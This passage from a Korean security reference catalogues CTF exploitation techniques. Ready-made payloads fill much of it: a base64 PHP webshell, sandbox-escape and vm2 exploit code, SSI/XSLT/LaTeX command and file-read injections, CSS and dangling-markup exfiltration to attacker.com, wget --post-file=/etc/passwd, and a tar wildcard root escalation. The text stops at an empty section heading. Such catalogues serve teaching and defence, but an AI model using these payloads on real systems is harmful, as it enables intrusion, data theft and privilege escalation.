# CTF Exotic Tricks — Unusual but Practically Valuable Exploitation Techniques

> CTF 대회(Google CTF, PlaidCTF, HITCON CTF, DiceCTF, corCTF, SekaiCTF 등)에서 반복 등장하지만 기존 취약점 분류 체계에서 독립적으로 다루어지지 않는 특이 기법들의 구조적 분류. 각 기법은 실제 버그바운티 및 실무 침투테스트에서도 실용적 가치를 갖는다.

---

## Taxonomy Structure

| Axis | Description |
|------|------------|
| **Axis 1 — Trick Category** | 기법이 속한 구조적 분류 (언어 타입 시스템, 암호 프리미티브, 샌드박스 탈출 등) |
| **Axis 2 — Mutation Vector** | 구체적으로 무엇을 조작하는가 (비교 연산자, 필터 체인, PRNG 상태 등) |
| **Axis 3 — Exploitation Context** | 실제 공격 시나리오 및 실용적 영향 (인증 우회, 비밀 유출, RCE 등) |

---

## Table of Contents

1. [Language Type System Abuse](#1-language-type-system-abuse)
2. [PHP Wrapper & Filter Chain Exploitation](#2-php-wrapper--filter-chain-exploitation)
3. [Sandbox / Jail Escape](#3-sandbox--jail-escape)
4. [Cryptographic Primitive Abuse](#4-cryptographic-primitive-abuse)
5. [DOM-Based Exotic Attacks](#5-dom-based-exotic-attacks)
6. [Exotic Server-Side Injection Vectors](#6-exotic-server-side-injection-vectors)
7. [Argument & Flag Injection](#7-argument--flag-injection)
8. [Regex-Based Exploitation](#8-regex-based-exploitation)
9. [Source & Configuration Exposure Exploitation](#9-source--configuration-exposure-exploitation)
10. [Environment Variable Injection](#10-environment-variable-injection)
11. [Python-Specific Exploitation Primitives](#11-python-specific-exploitation-primitives)
12. [Browser Mechanism Abuse](#12-browser-mechanism-abuse)

---

## 1. Language Type System Abuse

> 언어의 타입 비교 규칙 자체를 악용하여 인증/검증 로직을 우회하는 기법군. PHP < 8의 loose comparison이 가장 대표적이며, JavaScript의 implicit coercion도 CTF에서 빈번히 출현.

### 1.1 PHP Loose Comparison (`==`) Exploitation

**Root Cause**: PHP의 `==` 연산자는 비교 전에 타입 변환(type juggling)을 수행. 문자열이 숫자처럼 보이면 숫자로 변환.

#### 1.1.1 Magic Hash (0e Prefix)

MD5/SHA1 해시 결과가 `0e[0-9]+` 패턴이면 PHP는 이를 과학적 표기법(0 × 10^n = 0)으로 해석.

```
"0e462097431906509019562988736854" == "0e830400451993494058024219903391"  → true (both == 0)
```

**Known Magic Hash Seeds**:
| Algorithm | Input | Hash |
|-----------|-------|------|
| MD5 | `240610708` | `0e462097431906509019562988736854` |
| MD5 | `QNKCDZO` | `0e830400451993494058024219903391` |
| SHA1 | `10932435112` | `0e07766915004133176347055865026311692244` |

**Exploitation Context**: `if (md5($password) == md5($stored))` 형태의 인증에서 양쪽 모두 0e hash를 만들면 우회.

#### 1.1.2 String-to-Integer Coercion

```php
"0" == false   → true
"" == false    → true
"php" == 0     → true (PHP < 8)
"1abc" == 1    → true (PHP < 8)
```

**Exploitation Context**: `if ($input == 0)` 검증에서 문자열 입력으로 우회. PHP 8에서는 saner comparison으로 대부분 수정됨.

#### 1.1.3 Array vs String Comparison

```php
strcmp([], "password")   → NULL (warning) → NULL == 0 → true
md5([])                  → NULL
```

**Exploitation Context**: `strcmp($_POST['password'], $secret) == 0` 에서 배열을 보내면 NULL이 반환되고 `NULL == 0`은 true.

**Payload**: `password[]=anything`

#### 1.1.4 `intval()` vs `is_numeric()` Discrepancy

```php
is_numeric("0x1A")  → true (PHP < 7)
intval("0x1A")      → 0

is_numeric("1e2")   → true
intval("1e2")       → 1
(int)"1e2"          → 1
"1e2" + 0           → 100.0
```

**Exploitation Context**: `is_numeric()`로 검증 후 `intval()`로 사용하면 값이 다르게 해석됨.

#### 1.1.5 `json_decode()` Type Preservation

```php
json_decode('{"key": true}')   → key는 boolean true
true == "any_string"           → true (PHP < 8)
```

**Exploitation Context**: JSON 입력에서 `true`를 보내면 어떤 문자열과도 loose comparison에서 true.

**Real-World Impact**: 실제 PHP 애플리케이션의 인증/권한 체크에서 빈번히 발견. PHP 8 이전 버전이 여전히 운영 환경에 다수 존재.

### 1.2 JavaScript Type Coercion Tricks

#### 1.2.1 Loose Equality Surprises

```javascript
[] == false      → true
[] == ![]        → true
"" == false      → true
" \t\n" == 0     → true
null == undefined → true
```

#### 1.2.2 `parseInt()` / `Number()` Discrepancy

```javascript
parseInt("123abc")  → 123
Number("123abc")    → NaN
parseInt("0x10")    → 16
parseInt("010", 8)  → 8
+"1e2"              → 100
```

#### 1.2.3 Object `valueOf()` / `Symbol.toPrimitive` Abuse

```javascript
const obj = { [Symbol.toPrimitive](hint) { return hint === 'number' ? 42 : 'admin'; } };
obj == 42    → true
obj == "admin" → true
```

**Exploitation Context**: 사용자 객체를 통한 비교 로직 우회. CTF에서 `==` 사용 시 빈번히 등장.

---

## 2. PHP Wrapper & Filter Chain Exploitation

> PHP의 stream wrapper 시스템을 악용하여 LFI를 파일 읽기, 나아가 RCE까지 확장하는 기법군. `include`, `require`, `file_get_contents` 등 파일 함수에 사용자 입력이 들어갈 때 발동.

### 2.1 `php://filter` — File Read Without Execution

**Mechanism**: `php://filter`는 파일을 읽되 PHP 엔진이 실행하지 않고 필터를 적용하여 반환.

```
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=index.php
```

**Exploitation Context**: LFI 취약점에서 PHP 소스 코드를 직접 읽기. `include`로 로드하면 실행되지만, base64 인코딩하면 소스가 출력됨.

### 2.2 PHP Filter Chain RCE (Synacktiv, 2022)

**Mechanism**: `php://filter` 체인을 연결하여 빈 파일(`php://temp`)로부터 임의의 문자열을 생성. `include`에 주입하면 PHP 코드 실행 가능.

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|
convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|
convert.base64-encode|convert.iconv.UTF8.UTF7|...|/resource=php://temp
```

**Tool**: `php_filter_chain_generator` (Synacktiv) — 임의 PHP 코드를 포함하는 필터 체인 자동 생성.

**Key Insight**: 파일 업로드 없이, LFI만으로 RCE 달성. `file_get_contents`, `include`, `require` 모두에 적용 가능.

### 2.3 PHP Filter Chain Oracle — Error-Based File Read

**Mechanism**: 필터 체인 적용 시 특정 문자가 포함되면 에러가 발생하는 점을 이용하여, 파일 내용을 비트 단위로 추론.

```
php://filter/dechunk|convert.base64-decode/resource=target.php
→ 파일 내용의 특정 바이트가 유효한 chunk hex가 아니면 에러 → oracle
```

**Tool**: `php_filter_chains_oracle_exploit` (Synacktiv)

**Exploitation Context**: 블라인드 LFI에서 에러 응답 차이만으로 파일 전체를 추출. `file_get_contents`, `finfo`, `getimagesize`, `hash_file` 등 다양한 파일 함수에 적용 가능.

### 2.4 Other PHP Wrappers

| Wrapper | Payload | Condition |
|---------|---------|-----------|
| `php://input` | POST body가 PHP 코드로 실행 | `allow_url_include=On` |
| `data://` | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+` | `allow_url_include=On` |
| `expect://` | `expect://id` | expect 확장 설치 |
| `zip://` | `zip:///tmp/shell.zip%23shell.php` | ZIP 내 PHP 파일 |
| `phar://` | `phar:///tmp/evil.phar/test.txt` | deserialization trigger |

**Real-World Relevance**: PHP filter chain RCE는 DownUnder CTF 2022에서 최초 공개 후 Google CTF, HITCON CTF 등 주요 대회에서 반복 출현. 실제 워드프레스 플러그인 등에서도 LFI→RCE 체인에 활용.

---

## 3. Sandbox / Jail Escape

> 제한된 실행 환경(Python jail, Node.js VM, restricted shell)에서 탈출하여 임의 코드를 실행하는 기법군. 언어 런타임의 내부 구조를 역이용.

### 3.1 Python Jail Escape (Pyjail)

Python의 동적 특성을 악용하여 `exec`, `eval`, `__import__` 등이 차단된 환경에서도 임의 실행을 달성.

#### 3.1.1 `__subclasses__()` Traversal

**Mechanism**: `object.__subclasses__()`를 통해 로드된 모든 클래스에 접근. `os._wrap_close` 등의 서브클래스에서 `os.system` 호출.

```python
# builtins가 제거된 환경에서:
().__class__.__bases__[0].__subclasses__()
# → 수백 개의 클래스 목록

# os._wrap_close 찾기 (인덱스는 환경마다 다름):
().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['system']('id')
```

#### 3.1.2 Builtins Restoration

```python
# __builtins__가 삭제된 경우:
[].__class__.__base__.__subclasses__()[X].__init__.__globals__['__builtins__']
# X = __import__를 globals에 가진 클래스의 인덱스

# 또는 exception traceback에서:
try:
    raise Exception()
except Exception as e:
    e.__traceback__.tb_frame.f_globals['__builtins__']
```

#### 3.1.3 Unicode Identifier Bypass

Python 3는 유니코드 식별자를 지원. NFC 정규화 후 동일한 식별자로 취급.

```python
# "import" 키워드가 필터링된 경우:
# U+FF49 (ｉ) → NFC → 'i'
ｉｍｐｏｒｔ os    # 일부 환경에서 작동
```

#### 3.1.4 `breakpoint()` Abuse

```python
breakpoint()  # → pdb 디버거 진입
# pdb 내에서:
import os; os.system('id')
```

**Condition**: Python 3.7+, `PYTHONBREAKPOINT` 환경변수가 차단되지 않은 경우.

#### 3.1.5 Bytecode Manipulation

```python
# compile() + exec()로 임의 바이트코드 실행
code = type((lambda:0).__code__)
# 바이트코드를 직접 조립하여 제한 우회
```

#### 3.1.6 `gc` Module Abuse

```python
import gc
gc.get_objects()  # 메모리 내 모든 Python 객체에 접근
# → 비밀 값, 함수 객체, 모듈 참조 등을 직접 탐색
```

**CTF Appearances**: PlaidCTF, SECCON CTF 2024 Quals, jailCTF 2025, LACTF 2025, KalmarCTF 2025 등에서 매년 다양한 변형 출제.

### 3.2 JavaScript / Node.js VM Sandbox Escape

#### 3.2.1 `vm` Module Basic Escape

**Mechanism**: Node.js `vm` 모듈은 별도의 V8 context를 만들지만, 프로토타입 체인은 공유됨.

```javascript
// sandbox 내부에서:
const process = this.constructor.constructor('return process')();
process.mainModule.require('child_process').execSync('id');
```

**Root Cause**: `this`는 sandbox 객체이지만, `this.constructor`는 sandbox 밖의 `Object` 생성자.

#### 3.2.2 `vm2` Library Escape (CVE-2023-37466, CVE-2023-32314, CVE-2026-22709)

```javascript
// CVE-2023-37466: 호스트 예외를 캐치하여 호스트 객체에 접근
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
try { fn(); } catch(e) {
    e.constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
}
```

**Real-World Impact**: vm2는 주간 1600만+ npm 다운로드. 온라인 코드 실행 환경, 플러그인 시스템, 서버리스 함수 등에서 사용. 2023년 연속 CVE 발견으로 프로젝트 일시 중단 후 2025년 부활.

#### 3.2.3 `Proxy` / `Symbol.toPrimitive` Escape

```javascript
const handler = {
    get(target, prop) {
        if (prop === 'then') return undefined; // Promise 방지
        return Reflect.get(...arguments);
    }
};
// Proxy로 sandbox 경계를 넘는 객체 참조 획득
```

### 3.3 Restricted Shell Escape

#### 3.3.1 rbash / rksh Escape

```bash
# vim을 통한 탈출:
vi
:set shell=/bin/bash
:shell

# Python을 통한 탈출:
python -c 'import os; os.system("/bin/bash")'

# awk를 통한 탈출:
awk 'BEGIN {system("/bin/bash")}'

# less/more를 통한 탈출:
less /etc/passwd
!/bin/bash
```

---

## 4. Cryptographic Primitive Abuse

> 올바른 암호 알고리즘을 사용하더라도 운용 모드(mode of operation)나 MAC 구성이 잘못되면 발생하는 공격. 웹 애플리케이션의 세션 토큰, API 서명, 암호화된 쿠키 등에 직접 적용.

### 4.1 Hash Length Extension Attack

**대상**: MD5, SHA-1, SHA-256 (Merkle-Damgård 구조 해시)
**비대상**: SHA-3, HMAC, BLAKE2

**Mechanism**: `H(secret || message)`의 해시값과 message의 길이를 알면, secret을 모르더라도 `H(secret || message || padding || attacker_data)`를 계산 가능.

```
원본: signature = SHA256(secret + "user=guest")
공격: signature' = SHA256(secret + "user=guest" + padding + "&admin=true")
→ secret을 모르면서도 유효한 서명 생성
```

**Tool**: `HashPump`, `hash_extender`

**Exploitation Context**: API 서명 검증 (`sign = md5(key + params)`), 쿠키 무결성 검증, 파일 무결성 체크에서 파라미터 추가/조작.

**Real-World**: Flickr API 서명 우회(2009), 다수의 커스텀 API 인증 시스템.

### 4.2 ECB Cut-and-Paste (Block Reordering)

**Mechanism**: ECB 모드는 각 블록을 독립적으로 암호화. 동일 평문 블록 → 동일 암호문 블록.

```
블록 1: "email=attacker@"  (16 bytes)
블록 2: "evil.com&role=us"  (16 bytes)
블록 3: "er&uid=10\x06..."  (16 bytes, PKCS7 padding)

별도 요청으로 "admin" 블록 생성:
블록 X: "admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"  (올바른 PKCS7 padding)

→ 블록 1 + 블록 2(role= 직전까지) + 블록 X를 조합하여 role=admin 토큰 생성
```

**Exploitation Context**: ECB로 암호화된 세션 쿠키, 라이선스 키, 구조화된 토큰에서 역할/권한 필드 교체.

### 4.3 CBC Bit-Flipping Attack

**Mechanism**: CBC에서 암호문 블록 N의 비트를 flip하면, 평문 블록 N+1의 같은 위치 비트가 flip됨 (블록 N은 깨짐).

```
원본 평문: ...;admin=false;...
         Block N (IV/이전 블록)  |  Block N+1

암호문 Block N에서 'f' → 't' 변환에 해당하는 비트 XOR:
'f' ^ 't' = 0x12
cipher[target_byte] ^= 0x12

→ 복호화 결과: Block N은 깨짐, Block N+1은 ";admin=true;" 로 변경
```

**Exploitation Context**: 암호화된 쿠키의 권한 필드 변조 (`admin=false` → `admin=true`), 토큰 내 사용자 ID 변경.

### 4.4 Padding Oracle Attack

**Mechanism**: PKCS#7 패딩 검증의 성공/실패 차이(에러 메시지, 응답 시간, HTTP 상태 코드)를 oracle로 사용하여 암호문 전체 복호화 및 임의 평문 암호화.

```
각 바이트에 대해 0x00~0xFF 시도:
- 패딩 에러 → 다음 값 시도
- 패딩 성공 → 해당 바이트의 중간값(intermediate value) 확정
- intermediate XOR desired_plaintext = 필요한 IV/이전 블록 값
```

**Tool**: `PadBuster`, `padding-oracle-attacker`

**Complexity**: 블록당 최대 256 × 16 = 4,096 요청. 전체 메시지는 블록 수 × 4,096.

**Real-World CVEs**:
- ASP.NET Padding Oracle (CVE-2010-3332) — ViewState 복호화 → web.config 유출
- Ruby on Rails Cookie (CVE-2013-1800)
- Java Faces ViewState
- POODLE (CVE-2014-3566) — SSL 3.0 CBC 패딩

### 4.5 Weak PRNG State Recovery

**Mechanism**: 비암호학적 PRNG(Mersenne Twister)는 624개의 32비트 출력을 관찰하면 내부 상태를 완전히 복원 가능.

| Language | PRNG | Tool |
|----------|------|------|
| PHP | `mt_rand()` | `php_mt_seed`, `untwister` |
| Python | `random.random()` | `mersenne-twister-predictor`, `randcrack` |
| Java | `java.util.Random` | 2개 출력만으로 시드 복구 (48비트 LCG) |
| Ruby | `Kernel.rand` | Mersenne Twister, 624 출력 |

```python
# Python 예시 — 624개 출력으로 다음 값 예측:
import random
from mersenne_twister_predictor import MT19937Predictor

predictor = MT19937Predictor()
for _ in range(624):
    predictor.setrandbits(random.getrandbits(32), 32)

assert predictor.getrandbits(32) == random.getrandbits(32)  # 예측 성공
```

**Partial Output**: Z3 SMT solver를 사용하면 부분 출력(예: 하위 16비트만)으로도 상태 복구 가능.

**Exploitation Context**: 비밀번호 리셋 토큰, 세션 ID, CSRF 토큰, 임시 파일명 등이 `mt_rand()`/`random()`으로 생성되는 경우 예측.

**CTF Appearances**: Google CTF 2025 Postviewer v5 (base36 인코딩된 난수 복구 → PRNG crack → salt 예측).

### 4.6 Hash Collision Exploitation

**Mechanism**: MD5는 동일 해시를 가진 두 개의 다른 입력을 chosen-prefix collision으로 생성 가능 (실용적 시간 내).

```bash
# hashclash (Marc Stevens) 도구로 MD5 chosen-prefix collision 생성
# 동일 MD5를 가진 두 PDF 파일 생성 가능
```

**Exploitation Context**:
- `md5($file1) == md5($file2)` 무결성 검증 우회
- 인증서 위조 (MD5 기반 CA, 실제 2008년 시연)
- Git 객체 충돌 (SHA-1, SHAttered attack)
- CTF에서 "두 개의 다른 파일이 같은 해시를 가져야 한다" 류의 문제

---

## 5. DOM-Based Exotic Attacks

> XSS가 불가능하거나 CSP가 엄격한 환경에서 JavaScript 없이 또는 제한된 HTML/CSS만으로 데이터를 유출하거나 행위를 유도하는 기법군.

### 5.1 DOM Clobbering

**Mechanism**: HTML 요소의 `id`/`name` 속성이 `window`/`document` 객체의 프로퍼티로 등록되어 JavaScript 변수를 덮어쓸 수 있음.

```html
<!-- 기존 JS 코드: if (window.isAdmin) { ... } -->
<img id="isAdmin">
<!-- → window.isAdmin = <img> 요소 (truthy) → 조건 통과 -->

<!-- 중첩 clobbering (a.b 형태): -->
<form id="config"><input name="url" value="https://evil.com"></form>
<!-- → document.config.url === "https://evil.com" -->

<!-- 3단 중첩 (a.b.c 형태): -->
<form id="config" name="config">
  <input id="config" name="api">
</form>
<!-- → document.config.api.value 접근 가능 -->
```

**DOMPurify Bypass**: DOMPurify는 `SANITIZE_DOM` 옵션으로 clobbering을 방어하지만, 이 옵션이 비활성화되거나 커스텀 설정이 사용되면 우회 가능.

**Exploitation Context**:
- 스크립트 URL 조작: `<a id="defaultAvatar" href="https://evil.com/xss.js">` → `document.defaultAvatar.href`로 스크립트 로드
- React Router의 `document.defaultView` clobbering (DiceCTF 2024)
- 설정 객체 덮어쓰기로 API 엔드포인트 변경

**CTF Appearances**: DiceCTF 2024 (defaultView clobbering), Intigriti January 2024 (jQuery selector override), Intigriti July 2024 (base tag + relative path).

### 5.2 Dangling Markup Injection

**Mechanism**: 닫히지 않은 HTML 태그를 주입하여 페이지의 이후 내용(CSRF 토큰, 비밀 데이터 등)을 공격자 서버로 전송. JavaScript 불필요.

```html
<!-- CSRF 토큰이 페이지에 있을 때: -->
<img src="https://attacker.com/steal?data=
<!-- 태그가 닫히지 않음 → 다음 " 까지의 모든 내용이 URL에 포함 -->

<!-- base tag injection: -->
<base href="https://attacker.com/">
<!-- → 페이지의 모든 상대 경로가 공격자 서버로 향함 -->

<!-- meta refresh로 데이터 전송: -->
<meta http-equiv="refresh" content="0;url=https://attacker.com/steal?
```

**CSP Bypass**: CSP의 `img-src`가 `*`이거나 공격자 도메인을 허용하면, `<img src=` dangling으로 토큰 유출. `base-uri` 지시어가 없으면 `<base>` 태그로 전체 상대 경로 하이재킹.

### 5.3 CSS Injection for Data Exfiltration

**Mechanism**: CSS attribute selector로 HTML 속성값을 한 글자씩 추론. JavaScript 없이 작동.

```css
/* CSRF 토큰 한 글자씩 유출: */
input[name="csrf"][value^="a"] { background: url(https://attacker.com/?c=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.com/?c=b); }
/* ... 모든 문자에 대해 ... */

/* 첫 글자 확정 후 두 번째 글자: */
input[name="csrf"][value^="xa"] { background: url(https://attacker.com/?c=xa); }
```

**Advanced Techniques**:

| Technique | Description |
|-----------|------------|
| `@font-face` + `unicode-range` | 특정 문자가 존재하면 폰트 요청 발생 |
| `@import` chaining | 재귀적 CSS 로드로 자동화된 문자 추론 |
| `:has()` selector | 자식/형제 요소 기반 조건부 스타일링 (2024+) |
| `scroll-to-text` | Chrome의 텍스트 프래그먼트로 컨텐츠 존재 여부 확인 |

**Exploitation Context**: 엄격한 CSP (`script-src 'none'`) 환경에서 CSRF 토큰, 이메일 주소, API 키 등 유출.

### 5.4 Relative Path Overwrite (RPO)

**Mechanism**: 서버와 브라우저의 경로 해석 차이를 이용하여 CSS 파일 대신 HTML 페이지를 CSS로 파싱하게 만듦.

```
URL: https://target.com/page/..%2f..%2fstyles.css
서버: path normalization → /styles.css (정상 CSS)
브라우저: 상대 경로 기준 = /page/ → CSS import를 /page/ 기준으로 해석
```

**Exploitation Context**: 페이지 내용이 CSS로 파싱되면서 CSS injection과 동일한 공격이 가능해짐.

---

## 6. Exotic Server-Side Injection Vectors

> 일반적인 injection(SQL, Command, SSTI)이 아닌, 특수한 서버 측 처리 엔진(SSI, ESI, LaTeX, XSLT, PDF 렌더러)을 대상으로 하는 injection 기법군.

### 6.1 Server-Side Include (SSI) Injection

**대상**: Apache httpd (`mod_include`), Nginx (`ngx_http_ssi_module`), IIS

```html
<!--#exec cmd="id" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#include virtual="/etc/passwd" -->
<!--#echo var="DOCUMENT_ROOT" -->
<!--#config timefmt="%D %r" -->

<!-- 조건부 실행: -->
<!--#if expr="$QUERY_STRING = /admin/" -->
  <!--#exec cmd="cat /flag" -->
<!--#endif -->
```

**Identification**: `.shtml`, `.shtm`, `.stm` 확장자 또는 `Content-Type` 헤더에 SSI 처리 힌트.

**Real-World**: Apache 기본 설정에서 `.shtml` 파일은 SSI 처리됨. 파일 업로드 취약점과 결합하면 RCE.

### 6.2 Edge Side Include (ESI) Injection

**대상**: Varnish, Squid, Akamai, Fastly, IBM WebSphere, Oracle WebCache, F5 BIG-IP

```xml
<!-- SSRF: -->
<esi:include src="http://169.254.169.254/latest/meta-data/" />

<!-- XSS (CDN이 ESI를 처리하고 결과를 캐시): -->
<esi:include src="http://attacker.com/xss.html" />

<!-- 헤더 추가: -->
<esi:include src="/target" >
  <esi:request_header name="X-Forwarded-For" value="127.0.0.1"/>
</esi:include>

<!-- 조건부 실행 (Akamai): -->
<esi:choose>
  <esi:when test="$(HTTP_COOKIE{admin}) == 'true'">
    <esi:include src="/admin/panel" />
  </esi:when>
</esi:choose>
```

**Exploitation Chain**: ESI injection → SSRF (내부 서비스 접근) → 캐시에 악성 응답 저장 → 다른 사용자에게 전파.

**Detection Bypass**: ESI 태그가 HTML 주석처럼 보여서 WAF가 통과시키는 경우가 많음.

### 6.3 LaTeX Injection

**대상**: 이력서/문서 생성 서비스, 학술 논문 플랫폼, 수식 렌더링 API, ShareLaTeX/Overleaf 자체 호스팅

```latex
% 파일 읽기:
\input{/etc/passwd}
\include{/etc/passwd}

% 명령 실행 (write18 활성화 시):
\immediate\write18{id > /tmp/out}
\input{/tmp/out}

% 파일 읽기 (write18 없이):
\newread\file
\openin\file=/etc/passwd
\read\file to \line
\text{\line}
\closein\file

% 반복 읽기:
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
  \read\file to \fileline
  \fileline
\repeat
\closein\file

% URL fetch (일부 엔진):
\url{file:///etc/passwd}
```

**Restricted Mode Bypass**: `--shell-escape` 비활성화 시에도 `\input`, `\openin`으로 파일 읽기 가능. `texmf.cnf`의 `openin_any` 설정에 의존.

### 6.4 XSLT Injection

**대상**: XML 처리 파이프라인, SOAP 서비스, CMS, 리포트 생성 시스템

```xml
<!-- 파일 읽기: -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- RCE (Xalan-J): -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj, 'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- RCE (PHP): -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system', 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**CVE-2024-36522**: Apache Wicket — XSLT injection으로 RCE.

### 6.5 HTML-to-PDF SSRF / LFI

**대상**: wkhtmltopdf, Puppeteer/Chromium headless, WeasyPrint, Prince XML, mPDF

```html
<!-- wkhtmltopdf — 로컬 파일 읽기: -->
<iframe src="file:///etc/passwd" width="100%" height="500"></iframe>

<!-- wkhtmltopdf — SSRF: -->
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>

<!-- JavaScript 기반 (wkhtmltopdf는 QtWebKit 사용): -->
<script>
  x = new XMLHttpRequest();
  x.open("GET", "file:///etc/passwd", false);
  x.send();
  document.write("<pre>" + x.responseText + "</pre>");
</script>

<!-- Puppeteer — 로컬 파일: -->
<link rel="stylesheet" href="file:///etc/passwd">

<!-- Header/Footer template injection: -->
<!-- wkhtmltopdf --header-html 옵션에 사용자 입력이 들어가면: -->
<script>document.write(document.location)</script>
```

**CVE-2022-35583**: wkhtmltopdf 0.12.6 SSRF (CVSS 9.8).

**Exploitation Chain**: 사용자가 HTML을 입력 → PDF로 변환 → 서버 측에서 렌더링 시 내부 네트워크 접근/파일 읽기.

---

## 7. Argument & Flag Injection

> 웹 애플리케이션이 사용자 입력을 CLI 명령의 인자(argument)로 전달할 때, 명령어 구분자(`;`, `|`, `&&`) 대신 **플래그/옵션**을 주입하여 의도치 않은 동작을 유발하는 기법. 커맨드 인젝션 필터를 우회하는 핵심 패턴.

### 7.1 Direct Flag Injection

사용자 입력이 명령의 인자 위치에 들어갈 때 `--` 이전의 옵션 플래그를 주입.

| Tool | Injected Flag | Effect |
|------|--------------|--------|
| `curl` | `-o /tmp/shell.php` | 응답을 파일로 저장 |
| `curl` | `--next http://attacker.com` | 추가 요청 전송 |
| `wget` | `-O /var/www/html/shell.php` | 다운로드 파일 경로 지정 |
| `wget` | `--post-file=/etc/passwd` | 파일 내용을 POST로 전송 |
| `git` | `--upload-pack="id"` | clone/fetch 시 임의 명령 실행 |
| `git` | `-c protocol.ext.allow=always --config=http.proxy=http://evil` | 설정 주입 |
| `ssh` | `-o ProxyCommand="id"` | 연결 시 임의 명령 실행 |
| `tar` | `--checkpoint-action=exec=sh shell.sh` | 체크포인트마다 명령 실행 |
| `rsync` | `-e "sh -c id"` | 원격 셸 지정으로 명령 실행 |
| `find` | `-exec id \;` | 검색 결과마다 명령 실행 |
| `zip`/`7z` | `-TmTT="sh -c id"` | 테스트 시 명령 실행 |
| `sendmail` | `-OQueueDirectory=/tmp -X/var/www/shell.php` | 로그를 웹쉘로 기록 |

**Mitigation**: 인자 앞에 `--`를 사용하여 옵션 종료 표시 (`git clone -- $user_input`).

### 7.2 Wildcard Injection (Glob Expansion Attack)

**Mechanism**: cron job이나 스크립트에서 `*` 와일드카드가 확장될 때, 파일명이 명령 플래그로 해석됨.

```bash
# 공격 시나리오: root의 cron에 "cd /uploads && tar -czf /backup/files.tgz *" 존재

# 공격자가 생성하는 파일:
touch "/uploads/--checkpoint=1"
touch "/uploads/--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /uploads/shell.sh

# cron 실행 시:
tar -czf /backup/files.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1 file2...
# → shell.sh가 root 권한으로 실행됨
```

**Other Wildcards**:
| Command | File Names | Effect |
|---------|-----------|--------|
| `chown * admin` | `--reference=attacker_file` | attacker_file의 소유자로 변경 |
| `chmod * 777` | `--reference=attacker_file` | attacker_file의 권한으로 변경 |
| `rsync * dst/` | `-e sh shell.sh` | 명령 실행 |

### 7.3 `--` (Double Dash) Bypass

일부 프로그램은 `--` 이후에도 특수 처리를 하거나, `--` 자체를 처리하지 않음.

```bash
# Node.js의 child_process.execFile에서:
execFile('git', ['clone', '--', userInput])
# userInput이 '-' 으로 시작하면 여전히 문제 가능 (일부 서브커맨드)
```

---

## 8. Regex-Based Exploitation

> 정규식 엔진의 동작 특성을 악용하여 검증을 우회하거나, 서비스 거부를 유발하거나, 데이터를 추출하는 기법군.

### 8.1 Multiline / DOTALL Confusion

**Mechanism**: `^`와 `$`는 기본적으로 문자열의 시작/끝을 의미하지만, multiline 모드(`/m`)에서는 각 줄의 시작/끝을 의미.

```python
import re

# 취약한 검증:
pattern = r"^[a-zA-Z0-9]+$"
re.match(pattern, "valid\n<script>alert(1)</script>")  # → Match! (첫 줄만 검사)

# DOTALL이 없을 때:
re.match(r"^safe.*content$", "safe\nmalicious\ncontent")  # → None
re.match(r"^safe.*content$", "safe\nmalicious\ncontent", re.DOTALL)  # → Match!
```

**Exploitation Context**: 입력 검증에서 `\n`, `\r`을 주입하여 단일 라인 검증 우회. HTTP 헤더 injection, 로그 injection 등에 활용.

### 8.2 ReDoS (Regular Expression Denial of Service)

**Mechanism**: 탐욕적(greedy) 수량자가 중첩되면 지수적 백트래킹 발생.

```
Evil Patterns:
(a+)+$          → "aaaaaaaaaaaaaab" → 지수적
(a|a)+$         → 동일
(a+)*$          → 동일
(.*a){x}        → x가 크면 지수적

실용 예시:
^(([a-z])+.)+[A-Z]([a-z])+$   → 이메일 검증 유사 패턴
(.*\n){1,}$                     → 멀티라인 입력
```

**Real-World CVEs**:
- `ua-parser-js` (CVE-2021-27292) — User-Agent 파싱 ReDoS
- `color-string` — CSS 색상 파싱 ReDoS
- `semver-regex` — 버전 문자열 파싱 ReDoS
- Node.js core `path` 모듈 (CVE-2024-22019)

### 8.3 Blind Regex Injection (Data Exfiltration)

**Mechanism**: 사용자가 정규식 패턴을 제어할 수 있을 때, ReDoS를 oracle로 사용하여 매칭 대상 문자열을 한 글자씩 추출.

```
Target string: "FLAG{s3cr3t}"

Inject: "^FLAG\{s.*$" → 매치 성공 → 빠른 응답
Inject: "^FLAG\{x.*$" → 매치 실패 → 빠른 응답
Inject: "^FLAG\{s[ReDoS payload]$" → 매치 후 백트래킹 → 느린 응답 (일치 확인!)
```

**Exploitation Context**: 검색 기능에서 정규식을 지원하는 경우, 데이터베이스 내용을 추론.

### 8.4 `\n` vs `\r\n` Line Ending Exploitation

```python
# Windows vs Unix 라인 엔딩 차이:
re.match(r"^safe$", "safe\r\nmalicious")  # → Match! (\r이 $에 매치되지 않음)
```

---

## 9. Source & Configuration Exposure Exploitation

